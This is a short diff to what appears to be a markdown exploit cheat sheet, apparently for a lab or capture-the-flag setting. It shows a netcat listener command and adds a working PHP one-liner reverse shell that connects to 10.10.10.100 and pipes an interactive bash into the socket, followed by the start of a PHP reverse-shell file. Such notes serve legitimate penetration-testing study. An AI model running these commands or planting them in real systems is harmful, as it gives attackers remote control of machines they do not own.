@@ -60,7 +60,12 @@ exploit
 ```bash
 nc -lvnp 4444
 ```
-### Reverse shell:
+### Reverse shell
+Command:
+```bash
+php -r '$sock=fsockopen("10.10.10.100",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+File:
 ```php
 <?php
 $ip = '10.10.10.100'; // change this to your IP address
